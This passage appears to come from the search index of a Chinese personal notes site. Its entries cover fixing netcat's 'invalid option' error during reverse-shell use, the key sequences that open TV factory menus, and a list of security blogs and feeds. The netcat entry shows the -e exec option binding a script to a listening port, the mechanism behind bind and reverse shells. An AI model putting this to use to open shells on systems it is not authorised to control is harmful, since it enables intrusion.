TarsosDSP"},{"location":"other/nc%3A%20invalid%20option%20%E2%80%94%20%E2%80%98-%E2%80%98/","text":"nc\u53cd\u5f39shell\u7684\u65f6\u5019\u51fa\u73b0\u9519\u8bef nc: invalid option \u2014 \u2018-\u2018 \u9700\u8981\u5b89\u88c5netcat-traditional 1. enable universe repository (if not enabled)`sudo add-apt-repository universe` 2. Install the other netcat using synaptic. (To do this, the universe repository must be enabled.)`sudo apt-get install netcat-traditional` 3. type `sudo update-alternatives --config nc` 4. Select the option `/bin/nc.traditional` 5. type `nc -h` \u8f93\u51fa\uff1a [v1.10-41.1] connect to somewhere: nc [-options] hostname port[s] [ports] \u2026 listen for inbound: nc -l -p port [-options] [hostname] [port] options: -c shell commands as `-e\u2019; use /bin/sh to exec [dangerous!!] -e filename program to exec after connect [dangerous!!] -b allow broadcasts \u4ece\u4e2d\u53ef\u4ee5\u770b\u5230\u6709\u5c06\u8fdc\u7a0b\u6587\u4ef6/\u547d\u4ee4\u8f93\u51fa\u5230\u7f51\u7edc\u7684\u53c2\u6570\uff0c\u7c7b\u4f3cCTF\u4e2d\u7684\u65b9\u5f0f\uff1a \u4f7f\u7528\u8bf4\u660e\uff1a Here is a full example that works: The script: #!/bin/bash echo \"Give me a line...\" while read ln; do echo \"I got '$ln'\" echo \"Give me a line...\" done Start a listener nc -l -p 9999 -e ./zzz.sh Connect to the script: nc 127.0.0.1 9999 you will see Give me a line... type Hello script... and you will see two more lines I got 'Hello script...' Give me a line... Check if you did not forget to chmod a+x script.sh. If nc can not execute the script you will get something like: $ nc -l -p 9999 -e ./zzz.shs exec: No such file or directory Also, choose ports in the range [1025 .. 65535], [1 .. 1024] are available only to the root user. \u5ba2\u6237\u7aef\u88ab\u62d2\u7edd\uff1f (UNKNOWN) [127.0.0.1] 9999 (?) : Connection refused nc\u7aef\u53e3\u9519\u8bef\uff1a-p\u6ca1\u6709\u6b63\u786e\u7684\u8bbe\u7f6e \u539f\u6587\u94fe\u63a5\uff1a http://droid10.com/2021/06/25/nc-invalid-option/","title":"Nc: invalid option \u2014 \u2018 \u2018"},{"location":"other/nc%3A%20invalid%20option%20%E2%80%94%20%E2%80%98-%E2%80%98/#netcat-traditional","text":"1. enable universe repository (if not enabled)`sudo add-apt-repository universe` 2. Install the other netcat using synaptic. (To do this, the universe repository must be enabled.)`sudo apt-get install netcat-traditional` 3. type `sudo update-alternatives --config nc` 4. Select the option `/bin/nc.traditional` 5. type `nc -h` \u8f93\u51fa\uff1a [v1.10-41.1] connect to somewhere: nc [-options] hostname port[s] [ports] \u2026 listen for inbound: nc -l -p port [-options] [hostname] [port] options: -c shell commands as `-e\u2019; use /bin/sh to exec [dangerous!!] -e filename program to exec after connect [dangerous!!] -b allow broadcasts \u4ece\u4e2d\u53ef\u4ee5\u770b\u5230\u6709\u5c06\u8fdc\u7a0b\u6587\u4ef6/\u547d\u4ee4\u8f93\u51fa\u5230\u7f51\u7edc\u7684\u53c2\u6570\uff0c\u7c7b\u4f3cCTF\u4e2d\u7684\u65b9\u5f0f\uff1a","title":"\u9700\u8981\u5b89\u88c5netcat-traditional"},{"location":"other/nc%3A%20invalid%20option%20%E2%80%94%20%E2%80%98-%E2%80%98/#_1","text":"Here is a full example that works: The script: #!/bin/bash echo \"Give me a line...\" while read ln; do echo \"I got '$ln'\" echo \"Give me a line...\" done Start a listener nc -l -p 9999 -e ./zzz.sh Connect to the script: nc 127.0.0.1 9999 you will see Give me a line... type Hello script... and you will see two more lines I got 'Hello script...' Give me a line... Check if you did not forget to chmod a+x script.sh. If nc can not execute the script you will get something like: $ nc -l -p 9999 -e ./zzz.shs exec: No such file or directory Also, choose ports in the range [1025 .. 65535], [1 .. 1024] are available only to the root user.","title":"\u4f7f\u7528\u8bf4\u660e\uff1a"},{"location":"other/nc%3A%20invalid%20option%20%E2%80%94%20%E2%80%98-%E2%80%98/#_2","text":"(UNKNOWN) [127.0.0.1] 9999 (?) : Connection refused nc\u7aef\u53e3\u9519\u8bef\uff1a-p\u6ca1\u6709\u6b63\u786e\u7684\u8bbe\u7f6e \u539f\u6587\u94fe\u63a5\uff1a http://droid10.com/2021/06/25/nc-invalid-option/","title":"\u5ba2\u6237\u7aef\u88ab\u62d2\u7edd\uff1f"},{"location":"other/%E4%B8%8D%E6%80%95%E5%A5%B8%E5%95%86%20%E6%8F%AD%E5%90%84%E5%93%81%E7%89%8C%E7%94%B5%E8%A7%86%E8%BF%9B%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E6%96%B9%E6%B3%95/","text":"\u4e0d\u6015\u5978\u5546 \u63ed\u5404\u54c1\u724c\u7535\u89c6\u8fdb\u5de5\u5382\u6a21\u5f0f\u65b9\u6cd5 \u3010IT168 \u5e94\u7528\u3011\u7535\u89c6\u7684\u4ef7\u683c\u867d\u7136\u5df2\u7ecf\u8fdb\u5165\u4e86\u5e73\u4ef7\u65f6\u4ee3\uff0c\u4e0d\u8fc7\u4e0d\u7ba1\u600e\u4e48\u8bf4\u5b83\u90fd\u7b97\u662f\u4e2a\u5927\u7269\u4ef6\uff0c\u6d88\u8d39\u8005\u5728\u8d2d\u4e70\u7684\u65f6\u5019\u8fd8\u662f\u4f1a\u614e\u91cd\u7684\u8003\u8651\uff0c\u751f\u6015\u4e70\u4e86\u4e4b\u540e\u4e0d\u79f0\u5fc3\u5982\u610f\u3002\u4f46\u662f\u73b0\u5728\u7684\u5978\u5546\u82b1\u62db\u5f88\u591a\uff0c\u4ee5\u6b21\u5145\u597d\uff0c\u4ee5\u65e7\u5145\u65b0\u7684\u4e8b\u513f\u771f\u4e0d\u5728\u5c11\u6570\uff0c\u6d88\u8d39\u8005\u6709\u4ec0\u4e48\u529e\u6cd5\u907f\u514d\u53d7\u9a97\u5462\uff1f \u25b2\u5de5\u5382\u6a21\u5f0f\u754c\u9762 \u4e0d\u77e5\u9053\u5927\u5bb6\u542c\u8bf4\u8fc7\u201c\u5de5\u5382\u6a21\u5f0f\u201d\u6ca1\u6709\uff0c\u6bcf\u53f0\u7535\u89c6\u90fd\u53ef\u4ee5\u8fdb\u5165\u201c\u5de5\u5382\u6a21\u5f0f\u201d\uff0c\u5728\u201c\u5de5\u5382\u6a21\u5f0f\u201d\u91cc\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7535\u89c6\u7684\u8fd0\u884c\u65f6\u95f4\u548c\u91c7\u7528\u9762\u677f\u7c7b\u578b\u7b49\u4fe1\u606f\uff0c\u5982\u679c\u6d88\u8d39\u8005\u5728\u6536\u8d27\u65f6\u8fdb\u5165\u201c\u5de5\u5382\u6a21\u5f0f\u201d\u5c31\u77e5\u9053\u7535\u89c6\u662f\u5426\u4e3a\u5168\u65b0\uff0c\u91c7\u7528\u9762\u677f\u7a76\u7adf\u4e3a\u54ea\u79cd\uff0c\u8fd9\u6837\u5c31\u80fd\u907f\u514d\u522b\u65e0\u826f\u7684\u5546\u5bb6\u6b3a\u9a97\u3002\u4f46\u662f\u8fdb\u5165\u201c\u5de5\u5382\u6a21\u5f0f\u201d\u9700\u8981\u67d0\u79cd\u7279\u5b9a\u7684\u201c\u5bc6\u7801\u201d\uff0c\u4e00\u822c\u6d88\u8d39\u8005\u8fd8\u771f\u4e0d\u77e5\u9053\u3002\u4eca\u5929\u7b14\u8005\u5c31\u4e3a\u5927\u5bb6\u6536\u96c6\u4e86\u5404\u4e3b\u6d41\u54c1\u724c\u7535\u89c6\u8fdb\u5165\u201c\u5de5\u5382\u6a21\u5f0f\u201d\u9700\u8981\u8fdb\u884c\u7684\u64cd\u4f5c\uff0c\u5982\u679c\u60a8\u6709\u8d2d\u4e70\u7535\u89c6\u7684\u6253\u7b97\uff0c\u53ef\u4ee5\u7559\u610f\u4e00\u4e0b\u3002 \u5de5\u5382\u6a21\u5f0f\u64cd\u4f5c\u6b65\u9aa4\u4e4b\u6d77\u4fe1 \u7528\u9065\u63a7\u9009\u62e9\uff0c\u83dc\u5355-\u58f0\u97f3\u8bbe\u7f6e\u91cc\uff0c\u9009\u62e9\u5e73\u8861\uff0c\u7136\u540e\u8f93\u51650532\uff0c\u5373\u53ef\u8fdb\u5165\u5de5\u7a0b\u6a21\u5f0f\uff0c\u6d77\u4fe1\u7535\u89c6\u90fd\u662f\u5982\u6b64\u8fdb\u3002 \u25b2\u6d77\u4fe1\u7535\u89c6 \u5de5\u5382\u6a21\u5f0f\u64cd\u4f5c\u6b65\u9aa4\u4e4b\u5eb7\u4f73 \u64cd\u4f5c\u9065\u63a7\u5668\uff0c\u6309\u4e00\u4e0b[MENU\u83dc\u5355]\u6309\u94ae\uff0c\u753b\u9762\u5f39\u51fa\u666e\u901a\u529f\u80fd\u8bbe\u7f6e\u83dc\u5355\u3002\u8fd9\u65f6\u8fde\u7eed\u70b9\u63095\u6b21[\u56de\u770b]\u6309\u94ae\uff0c\u5373\u53ef\u6253\u5f00\u5eb7\u4f73\u5f69\u7535\u5de5\u5382\u6a21\u5f0f\u83dc\u5355\u3002\u800c\u9000\u51fa\u53ea\u9700\u5728\u8bbe\u7f6e\u5b8c\u4ee5\u540e\u70b9\u4e00\u4e0b[\u56de\u770b]\u6309\u94ae\u5373\u53ef\u9000\u51fa\uff0c\u8fd4\u56de\u5230\u6b63\u5e38\u7535\u89c6\u753b\u9762\u3002 \u25b2\u5eb7\u4f73\u7535\u89c6 \u5de5\u5382\u6a21\u5f0f\u64cd\u4f5c\u6b65\u9aa4\u4e4bTCL \u4e00\u3001\u5148\u5c06\u97f3\u91cf\u51cf\u52300\uff0c\u7136\u540e\u8c03\u51fa\u4e3b\u83dc\u5355,\u5149\u6807\u79fb\u81f3\u201c\u5bf9\u6bd4\u5ea6\u201d\uff0c\u57282\u79d2\u5185\u8fc5\u901f\u6309\u6570\u5b57\u952e9\u30017\u30013\u30015\u5373\u53ef\u8fdb\u5165\u5de5\u5382\u6a21\u5f0f\u3002 \u4e8c\u3001\u6309\u51fa\u83dc\u5355(\u6309\u9065\u63a7\u5668\u4e0aMENU\u952e)\uff0c\u63a5\u7740\u6309\u9065\u63a7\u5668\u4e0a\u76848202\u3002 \u25b2TCL\u7535\u89c6 \u5de5\u5382\u6a21\u5f0f\u64cd\u4f5c\u6b65\u9aa4\u4e4b\u4e09\u661f \u5728\u5f85\u673a\u72b6\u6001\uff0c\u5206\u522b\u6309\u4e0b\u663e\u793a\u3001\u9879\u76ee\u3001\u9759\u97f3\u3001\u7535\u6e90\u3002 \u25b2\u4e09\u661f\u7535\u89c6 \u5de5\u5382\u6a21\u5f0f\u64cd\u4f5c\u6b65\u9aa4\u4e4b\u7d22\u5c3c \u5f00\u673a\uff0c\u64ad\u6709\u7ebf\u7535\u89c6\u8282\u76ee\uff0c\u6309\u9065\u63a7\u5668\u4e0a\u201c\u7535\u6e90/\u5f85\u673a\u201d\u952e\uff0c\u8fdb\u5165\u5f85\u673a\uff0c\u7136\u540e\u6309\u4e0b\u9762\u6b21\u5e8f\uff0c\u5148\u540e\u6309\u4e00\u4e0b\u9065\u63a7\u5668\u4e0a\u7684\u76f8\u5173\u6309\u952e\uff1a\u5c4f\u663e\u30015\u3001+(\u97f3\u91cf)\u3001\u7535\u6e90/\u5f85\u673a\u3002 \u25b2\u7d22\u5c3c\u7535\u89c6 \u5de5\u5382\u6a21\u5f0f\u64cd\u4f5c\u6b65\u9aa4\u4e4bLG \u540c\u65f6\u6309\u4f4f\u9065\u63a7\u5668\u548c\u7535\u89c6\u673a\u4e0a\u7684menu\u952e\u51e0\u79d2\u540e\u5c31\u8fdb\u5165\u4e86\u3002\u521d\u59cb\u5bc6\u7801\u662f0000\u3002 \u25b2LG\u7535\u89c6 \u5de5\u5382\u6a21\u5f0f\u64cd\u4f5c\u6b65\u9aa4\u4e4b\u677e\u4e0b \u628a\u97f3\u91cf\u5173\u5230\u96f6\uff0c\u6309\u9065\u63a7\u5668\u4e0a\u7684menu\u952e\uff0c\u5c4f\u5e55\u4e0a\u51fa\u73b0\u83dc\u5355\uff0c\u8fdb\u5165\u8bbe\u7f6e\uff0c\u5728\u5b9a\u65f6\u5173\u673a\u90a3\u9879\u968f\u4fbf\u9009\u62e9\u4e00\u4e2a\u65f6\u95f4\u3002\u540c\u65f6\u6309\u4e0b\u9065\u63a7\u5668\u4e0a\u7684\u547c\u51fa\u94ae(\u6570\u5b57\u952e0\u5de6\u8fb9)\u548c\u7535\u89c6\u4e0a\u7684\u9891\u9053\u51cf\u952e\uff0c\u5c4f\u5e55\u4e0a\u51fa\u73b0service 1\uff0c\u518d\u540c\u65f6\u6309\u4e0b\u9065\u63a7\u5668\u4e0a\u7684\u9759\u97f3\u952e\u548c\u7535\u89c6\u4e0a\u7684\u9891\u9053\u51cf\u952e\uff0c\u5c4f\u5e55\u4e0a\u51fa\u73b0service 2\uff0c\u6700\u540e\u6309\u4e0b\u6570\u5b57\u952e3\u5373\u53ef\u3002 \u25b2\u677e\u4e0b\u7535\u89c6 \u5de5\u5382\u6a21\u5f0f\u64cd\u4f5c\u6b65\u9aa4\u4e4b\u65e5\u7acb \u5c06\u7535\u6e90\u5f00\u5173\u6253\u5f00\uff0c\u673a\u5668\u5904\u4e8e\u5f85\u673a\u72b6\u6001\uff0c\u6309\u4f4fTV/VIDIO\u952e\u548c\u9891\u9053\u4e0b\u952e\uff0c\u540c\u65f6\u6309\u4f4f\u526f\u7535\u6e90\u5f00\u5173\u5f00\u673a\uff0c\u6309\u4f4f5\u79d2\u540e\u653e\u624b\uff0c\u5de5\u7a0b\u83dc\u5355\u5c31\u51fa\u6765\u4e86\u3002 \u25b2\u65e5\u7acb\u7535\u89c6 \u539f\u6587\u94fe\u63a5\uff1a https://elec.it168.com/a2011/0112/1149/000001149217_all.shtml","title":"\u4e0d\u6015\u5978\u5546 \u63ed\u5404\u54c1\u724c\u7535\u89c6\u8fdb\u5de5\u5382\u6a21\u5f0f\u65b9\u6cd5"},{"location":"other/%E4%B8%8D%E6%80%95%E5%A5%B8%E5%95%86%20%E6%8F%AD%E5%90%84%E5%93%81%E7%89%8C%E7%94%B5%E8%A7%86%E8%BF%9B%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E6%96%B9%E6%B3%95/#_1","text":"\u3010IT168 \u5e94\u7528\u3011\u7535\u89c6\u7684\u4ef7\u683c\u867d\u7136\u5df2\u7ecf\u8fdb\u5165\u4e86\u5e73\u4ef7\u65f6\u4ee3\uff0c\u4e0d\u8fc7\u4e0d\u7ba1\u600e\u4e48\u8bf4\u5b83\u90fd\u7b97\u662f\u4e2a\u5927\u7269\u4ef6\uff0c\u6d88\u8d39\u8005\u5728\u8d2d\u4e70\u7684\u65f6\u5019\u8fd8\u662f\u4f1a\u614e\u91cd\u7684\u8003\u8651\uff0c\u751f\u6015\u4e70\u4e86\u4e4b\u540e\u4e0d\u79f0\u5fc3\u5982\u610f\u3002\u4f46\u662f\u73b0\u5728\u7684\u5978\u5546\u82b1\u62db\u5f88\u591a\uff0c\u4ee5\u6b21\u5145\u597d\uff0c\u4ee5\u65e7\u5145\u65b0\u7684\u4e8b\u513f\u771f\u4e0d\u5728\u5c11\u6570\uff0c\u6d88\u8d39\u8005\u6709\u4ec0\u4e48\u529e\u6cd5\u907f\u514d\u53d7\u9a97\u5462\uff1f \u25b2\u5de5\u5382\u6a21\u5f0f\u754c\u9762 \u4e0d\u77e5\u9053\u5927\u5bb6\u542c\u8bf4\u8fc7\u201c\u5de5\u5382\u6a21\u5f0f\u201d\u6ca1\u6709\uff0c\u6bcf\u53f0\u7535\u89c6\u90fd\u53ef\u4ee5\u8fdb\u5165\u201c\u5de5\u5382\u6a21\u5f0f\u201d\uff0c\u5728\u201c\u5de5\u5382\u6a21\u5f0f\u201d\u91cc\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7535\u89c6\u7684\u8fd0\u884c\u65f6\u95f4\u548c\u91c7\u7528\u9762\u677f\u7c7b\u578b\u7b49\u4fe1\u606f\uff0c\u5982\u679c\u6d88\u8d39\u8005\u5728\u6536\u8d27\u65f6\u8fdb\u5165\u201c\u5de5\u5382\u6a21\u5f0f\u201d\u5c31\u77e5\u9053\u7535\u89c6\u662f\u5426\u4e3a\u5168\u65b0\uff0c\u91c7\u7528\u9762\u677f\u7a76\u7adf\u4e3a\u54ea\u79cd\uff0c\u8fd9\u6837\u5c31\u80fd\u907f\u514d\u522b\u65e0\u826f\u7684\u5546\u5bb6\u6b3a\u9a97\u3002\u4f46\u662f\u8fdb\u5165\u201c\u5de5\u5382\u6a21\u5f0f\u201d\u9700\u8981\u67d0\u79cd\u7279\u5b9a\u7684\u201c\u5bc6\u7801\u201d\uff0c\u4e00\u822c\u6d88\u8d39\u8005\u8fd8\u771f\u4e0d\u77e5\u9053\u3002\u4eca\u5929\u7b14\u8005\u5c31\u4e3a\u5927\u5bb6\u6536\u96c6\u4e86\u5404\u4e3b\u6d41\u54c1\u724c\u7535\u89c6\u8fdb\u5165\u201c\u5de5\u5382\u6a21\u5f0f\u201d\u9700\u8981\u8fdb\u884c\u7684\u64cd\u4f5c\uff0c\u5982\u679c\u60a8\u6709\u8d2d\u4e70\u7535\u89c6\u7684\u6253\u7b97\uff0c\u53ef\u4ee5\u7559\u610f\u4e00\u4e0b\u3002 \u5de5\u5382\u6a21\u5f0f\u64cd\u4f5c\u6b65\u9aa4\u4e4b\u6d77\u4fe1 \u7528\u9065\u63a7\u9009\u62e9\uff0c\u83dc\u5355-\u58f0\u97f3\u8bbe\u7f6e\u91cc\uff0c\u9009\u62e9\u5e73\u8861\uff0c\u7136\u540e\u8f93\u51650532\uff0c\u5373\u53ef\u8fdb\u5165\u5de5\u7a0b\u6a21\u5f0f\uff0c\u6d77\u4fe1\u7535\u89c6\u90fd\u662f\u5982\u6b64\u8fdb\u3002 \u25b2\u6d77\u4fe1\u7535\u89c6 \u5de5\u5382\u6a21\u5f0f\u64cd\u4f5c\u6b65\u9aa4\u4e4b\u5eb7\u4f73 \u64cd\u4f5c\u9065\u63a7\u5668\uff0c\u6309\u4e00\u4e0b[MENU\u83dc\u5355]\u6309\u94ae\uff0c\u753b\u9762\u5f39\u51fa\u666e\u901a\u529f\u80fd\u8bbe\u7f6e\u83dc\u5355\u3002\u8fd9\u65f6\u8fde\u7eed\u70b9\u63095\u6b21[\u56de\u770b]\u6309\u94ae\uff0c\u5373\u53ef\u6253\u5f00\u5eb7\u4f73\u5f69\u7535\u5de5\u5382\u6a21\u5f0f\u83dc\u5355\u3002\u800c\u9000\u51fa\u53ea\u9700\u5728\u8bbe\u7f6e\u5b8c\u4ee5\u540e\u70b9\u4e00\u4e0b[\u56de\u770b]\u6309\u94ae\u5373\u53ef\u9000\u51fa\uff0c\u8fd4\u56de\u5230\u6b63\u5e38\u7535\u89c6\u753b\u9762\u3002 \u25b2\u5eb7\u4f73\u7535\u89c6 \u5de5\u5382\u6a21\u5f0f\u64cd\u4f5c\u6b65\u9aa4\u4e4bTCL \u4e00\u3001\u5148\u5c06\u97f3\u91cf\u51cf\u52300\uff0c\u7136\u540e\u8c03\u51fa\u4e3b\u83dc\u5355,\u5149\u6807\u79fb\u81f3\u201c\u5bf9\u6bd4\u5ea6\u201d\uff0c\u57282\u79d2\u5185\u8fc5\u901f\u6309\u6570\u5b57\u952e9\u30017\u30013\u30015\u5373\u53ef\u8fdb\u5165\u5de5\u5382\u6a21\u5f0f\u3002 \u4e8c\u3001\u6309\u51fa\u83dc\u5355(\u6309\u9065\u63a7\u5668\u4e0aMENU\u952e)\uff0c\u63a5\u7740\u6309\u9065\u63a7\u5668\u4e0a\u76848202\u3002 \u25b2TCL\u7535\u89c6 \u5de5\u5382\u6a21\u5f0f\u64cd\u4f5c\u6b65\u9aa4\u4e4b\u4e09\u661f \u5728\u5f85\u673a\u72b6\u6001\uff0c\u5206\u522b\u6309\u4e0b\u663e\u793a\u3001\u9879\u76ee\u3001\u9759\u97f3\u3001\u7535\u6e90\u3002 \u25b2\u4e09\u661f\u7535\u89c6 \u5de5\u5382\u6a21\u5f0f\u64cd\u4f5c\u6b65\u9aa4\u4e4b\u7d22\u5c3c \u5f00\u673a\uff0c\u64ad\u6709\u7ebf\u7535\u89c6\u8282\u76ee\uff0c\u6309\u9065\u63a7\u5668\u4e0a\u201c\u7535\u6e90/\u5f85\u673a\u201d\u952e\uff0c\u8fdb\u5165\u5f85\u673a\uff0c\u7136\u540e\u6309\u4e0b\u9762\u6b21\u5e8f\uff0c\u5148\u540e\u6309\u4e00\u4e0b\u9065\u63a7\u5668\u4e0a\u7684\u76f8\u5173\u6309\u952e\uff1a\u5c4f\u663e\u30015\u3001+(\u97f3\u91cf)\u3001\u7535\u6e90/\u5f85\u673a\u3002 \u25b2\u7d22\u5c3c\u7535\u89c6 \u5de5\u5382\u6a21\u5f0f\u64cd\u4f5c\u6b65\u9aa4\u4e4bLG \u540c\u65f6\u6309\u4f4f\u9065\u63a7\u5668\u548c\u7535\u89c6\u673a\u4e0a\u7684menu\u952e\u51e0\u79d2\u540e\u5c31\u8fdb\u5165\u4e86\u3002\u521d\u59cb\u5bc6\u7801\u662f0000\u3002 \u25b2LG\u7535\u89c6 \u5de5\u5382\u6a21\u5f0f\u64cd\u4f5c\u6b65\u9aa4\u4e4b\u677e\u4e0b \u628a\u97f3\u91cf\u5173\u5230\u96f6\uff0c\u6309\u9065\u63a7\u5668\u4e0a\u7684menu\u952e\uff0c\u5c4f\u5e55\u4e0a\u51fa\u73b0\u83dc\u5355\uff0c\u8fdb\u5165\u8bbe\u7f6e\uff0c\u5728\u5b9a\u65f6\u5173\u673a\u90a3\u9879\u968f\u4fbf\u9009\u62e9\u4e00\u4e2a\u65f6\u95f4\u3002\u540c\u65f6\u6309\u4e0b\u9065\u63a7\u5668\u4e0a\u7684\u547c\u51fa\u94ae(\u6570\u5b57\u952e0\u5de6\u8fb9)\u548c\u7535\u89c6\u4e0a\u7684\u9891\u9053\u51cf\u952e\uff0c\u5c4f\u5e55\u4e0a\u51fa\u73b0service 1\uff0c\u518d\u540c\u65f6\u6309\u4e0b\u9065\u63a7\u5668\u4e0a\u7684\u9759\u97f3\u952e\u548c\u7535\u89c6\u4e0a\u7684\u9891\u9053\u51cf\u952e\uff0c\u5c4f\u5e55\u4e0a\u51fa\u73b0service 2\uff0c\u6700\u540e\u6309\u4e0b\u6570\u5b57\u952e3\u5373\u53ef\u3002 \u25b2\u677e\u4e0b\u7535\u89c6 \u5de5\u5382\u6a21\u5f0f\u64cd\u4f5c\u6b65\u9aa4\u4e4b\u65e5\u7acb \u5c06\u7535\u6e90\u5f00\u5173\u6253\u5f00\uff0c\u673a\u5668\u5904\u4e8e\u5f85\u673a\u72b6\u6001\uff0c\u6309\u4f4fTV/VIDIO\u952e\u548c\u9891\u9053\u4e0b\u952e\uff0c\u540c\u65f6\u6309\u4f4f\u526f\u7535\u6e90\u5f00\u5173\u5f00\u673a\uff0c\u6309\u4f4f5\u79d2\u540e\u653e\u624b\uff0c\u5de5\u7a0b\u83dc\u5355\u5c31\u51fa\u6765\u4e86\u3002 \u25b2\u65e5\u7acb\u7535\u89c6 \u539f\u6587\u94fe\u63a5\uff1a https://elec.it168.com/a2011/0112/1149/000001149217_all.shtml","title":"\u4e0d\u6015\u5978\u5546 \u63ed\u5404\u54c1\u724c\u7535\u89c6\u8fdb\u5de5\u5382\u6a21\u5f0f\u65b9\u6cd5"},{"location":"other/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%99%E7%82%B9%E6%94%B6%E9%9B%86/","text":"\u4fe1\u606f\u5b89\u5168\u7ad9\u70b9\u6536\u96c6 \u8f6c\u8f7d\u6765\u81ea\uff1a http://www.topdubhe.com/article-detials/4 \u56fd\u5185 \u535a\u5ba2 \u540d\u79f0 \u94fe\u63a5 RSS\u6e90 Hcamael https://0x48.pw/ https://0x48.pw/rss.xml Evi1cg https://evi1cg.me/ https://evi1cg.me/feed gracecode https://www.gracecode.com/ http://feeds.gracecode.com/gracecode/ nMask's\u535a\u5ba2 https://thief.one/ https://thief.one/atom.xml \u7ec4\u7ec7\uff0c\u8bba\u575b \u540d\u79f0 \u94fe\u63a5 RSS\u6e90 MottoIN http://www.mottoin.com/ http://www.mottoin.com/feed \u5b89\u5168\u5ba2 https://www.anquanke.com/ https://api.anquanke.com/data/v1/rss FREEBUF http://www.freebuf.com/ http://www.freebuf.com/feed http://www.freebuf.com/news/feed http://www.freebuf.com/sectool/feed http://www.freebuf.com/vuls/feed http://www.freebuf.com/articles/web/feed http://www.freebuf.com/articles/network/feed \u7f51\u7edc\u5b89\u5168\u7814\u7a76\u56fd\u9645\u5b66\u672f\u8bba\u575b https://www.inforsec.org/wp/ https://www.inforsec.org/wp/# \u8d81\u7740\u5e74\u8f7b http://chenzhenianqing.com/ http://chenzhenianqing.com/feed \u5148\u77e5\u793e\u533a https://xz.aliyun.com/ https://xz.aliyun.com/feed \u94f6\u6cb3\u5b9e\u9a8c\u5ba4 http://galaxylab.org/ http://galaxylab.org/feed/ \u6211\u6625\u79cb https://bbs.ichunqiu.com/forum.php \u65e0 \u5b89\u5168\u8109\u640f https://www.secpulse.com/ https://www.secpulse.com/feed \u5636\u543c http://www.4hou.com/ http://www.4hou.com/feed http://www.4hou.com/category/technology/feed \u5fae\u535a https://www.weibo.com/ttarticle/p/show?id=2309404263474069943104 \u65e0 \u6307\u5c16\u5b89\u5168 https://secfree.com/ https://secfree.com/rss 91\u65e5 http://www.91ri.org/ http://www.91ri.org/feed \u571f\u53f8\u5b89\u5168\u793e\u533a https://www.t00ls.net/ \u65e0 SecWiki https://sec-wiki.com/ https://sec-wiki.com/news/rss seebug https://paper.seebug.org/ https://paper.seebug.org/rss/ \u7384\u6b66\u5b9e\u9a8c\u5ba4 https://xlab.tencent.com/cn/ https://raw.githubusercontent.com/XuanwuLab/ XuanwuLab.github.io/master/cn/secnews/atom.xml https://xlab.tencent.com/cn/feed/ http://xuanwulab.github.io/cn/secnews/atom.xml \u817e\u8baf\u5b89\u5168\u54cd\u5e94\u4e2d\u5fc3 https://security.tencent.com/index.php/blog https://security.tencent.com/index.php/feed/blog/0 360\u5a01\u80c1\u60c5\u62a5\u4e2d\u5fc3 https://ti.360.net/blog/ \u65e0 360NetLab https://blog.netlab.360.com/ https://feedly.com/i/subscription/feed/http://blog.netlab.360.com/rss/ \u7eff\u76df\u79d1\u6280\u535a\u5ba2 http://blog.nsfocus.net/ http://blog.nsfocus.net/feed/ \u5b89\u5168\u725b http://www.aqniu.com/ http://www.aqniu.com/feed \u53f0\u6e7e\u8d8b\u52bf\u79d1\u6280 https://blog.trendmicro.com.tw/ https://blog.trendmicro.com.tw/?feed=rss2 \u77e5\u9053\u521b\u5b87 http://blog.knownsec.com/ http://blog.knownsec.com/feed/ \u5b89\u5168\u6751 https://www.sec-un.org/ https://www.sec-un.org/feed/ \u9ed1\u5ba2\u65b0\u95fb http://hackernews.cc/ http://hackernews.cc/feed \u6d1e\u6089\u6f0f\u6d1e https://www.seebug.org/ https://www.seebug.org/rss.xml \u543e\u7231\u7834\u89e3 https://www.52pojie.cn/ https://www.52pojie.cn/forum.php?mod=rss \u63a8\u9177 https://www.tuicool.com/ https://www.tuicool.com/mags/rss_programming.rss \u6811\u8393\u6d3e\u5b9e\u9a8c\u5ba4 http://shumeipai.nxez.com/ http://shumeipai.nxez.com/feed 51CTO http://netsecurity.51cto.com/col/518/ \u65e0 \u6bd4\u7279\u5e01\u8d22\u7ecf http://www.bitecoin.com/ http://www.bitecoin.com/feed \u56fd\u5916 \u540d\u79f0 \u94fe\u63a5 RSS\u6e90 0\u5929 https://cn.0day.today/ https://0day.today/ https://cn.0day.today/rss https://0day.today/rss\uff08\u603b\uff09 MailClark https://mailclark.ai/blog/ https://mailclark.ai/blog/feed.xml Linux\u5b89\u5168 http://www.linuxsecurity.com/ http://www.linuxsecurity.com/static-content/linuxsecurity_hybrid.rss\uff08\u603b\uff09 http://www.linuxsecurity.com/static-content/linuxsecurity_advisories.rss http://www.linuxsecurity.com/static-content/linuxsecurity_articles.rss http://www.linuxsecurity.com/static-content/ubuntu.rss CX\u5b89\u5168 https://cxsecurity.com/ https://cxsecurity.com/wlb/rss/all/\uff08\u603b\uff09 https://cxsecurity.com/cverss/fullmap/\uff08\u603b\uff09 https://cxsecurity.com/wlb/rss/vulnerabilities/ https://cxsecurity.com/wlb/rss/exploit/ https://cxsecurity.com/wlb/rss/dorks/ \u63d0\u4f9b\u6f0f\u6d1e\u67e5\u627e https://www.exploitalert.com/ \u65e0 OA\u5b9e\u9a8c\u5ba4 https://oalabs.openanalysis.net/ https://oalabs.openanalysis.net/rss/ PaloAltoNetworks researchcenter.paloaltonetworks.com http://feeds.feedburner.com/PaloAltoNetworks PacketStorm\u5b89\u5168 https://packetstormsecurity.com/ https://rss.packetstormsecurity.com/ \u706b\u773c https://www.fireeye.com/blog/threat-research.html https://www.fireeye.com/blog/threat-research/_jcr_content.feed https://www.fireeye.com/blog/products-and-services/_jcr_content.feed https://www.fireeye.com/blog/executive-perspective/_jcr_content.feed \u8d8b\u52bf\u79d1\u6280 https://www.trendmicro.com/ http://feeds.trendmicro.com/Anti-MalwareBlog http://feeds.trendmicro.com/TrendMicroSimplySecurity \u6d41\u91cf\u5206\u6790 http://malware-traffic-analysis.net/ http://malware-traffic-analysis.net/blog-entries.rss \u8d5b\u95e8\u94c1\u514b https://www.symantec.com/blogs/ https://www.symantec.com/connect/item-feeds/all/all/feed/all/all/all https://api.connect.symantec.com/rss/v1/blogs/rss.xml F-Secure https://labsblog.f-secure.com/ https://www.f-secure.com/en/web/labs_global/home https://labsblog.f-secure.com/feed/ https://business.f-secure.com/feed/ https://safeandsavvy.f-secure.com/feed/ 